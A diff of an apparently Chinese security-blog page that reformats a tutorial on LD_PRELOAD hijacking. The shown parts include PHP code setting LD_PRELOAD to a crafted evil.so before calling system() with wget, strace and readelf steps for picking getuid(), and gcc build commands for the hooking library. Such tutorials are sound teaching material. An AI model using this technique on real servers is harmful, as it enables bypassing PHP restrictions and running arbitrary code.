@@ -15,7 +15,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/52815563/1761710115065-b8346f38-3f02-4cbd-90fa-d6efed6cba36.png">
 <meta property="article:published_time" content="2025-12-16T13:04:06.000Z">
-<meta property="article:modified_time" content="2025-12-16T13:30:53.327Z">
+<meta property="article:modified_time" content="2025-12-16T13:48:30.899Z">
 <meta property="article:author" content="YUNiversity">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -88,6 +88,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/12/16/LD_PRELOAD/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="下一篇" href="/2025/05/09/SSRF%E6%89%93Fastcgi/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -197,15 +199,11 @@ putenv("LD_PRELOAD=./evil.so");
 system("nohup wget --content-disposition -N hhhh &");
 ?>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>我们追踪system</p>
-<p>:::tips<br>strace -f php system.php 2&gt;&amp;1 | grep execve   </p>
-<p>:::</p>
+<p>我们追踪system<br>strace -f php system.php 2&gt;&amp;1 | grep execve   </p>
 <p>可以看到就是我们预想的调用了wget</p>
-<p>再追踪wget</p>
-<p>:::tips<br>strace wget 2&gt;&amp;1</p>
+<p>再追踪wget<br>strace wget 2&gt;&amp;1</p>
 <p>readelf -Ws /usr/bin/wget</p>
 <p>#查看wget命令使用了哪些库函数  </p>
-<p>:::</p>
 <p>发现存在getuid()能函数，我们就选择getuid</p>
 <pre class="line-numbers language-language-c"><code class="language-language-c">#include <stdlib.h>
 #include <stdio.h>
@@ -220,13 +218,9 @@ int getuid()
     payload();
 }
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>编译</p>
-<p>:::tips<br>gcc -fPIC -shared -o evil.so ld.c -ldl</p>
-<p>:::</p>
-<p>再运行查看是否执行</p>
-<p>:::tips<br>php system.php</p>
+<p>编译<br>gcc -fPIC -shared -o evil.so ld.c -ldl</p>
+<p>再运行查看是否执行<br>php system.php</p>
 <p>cat res</p>
-<p>:::</p>
 <p><img src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2025/png/52815563/1761710115065-b8346f38-3f02-4cbd-90fa-d6efed6cba36.png"></p>
 <p>最终成功执行</p>
 <h1 id="TXGzp">劫持共享库</h1>
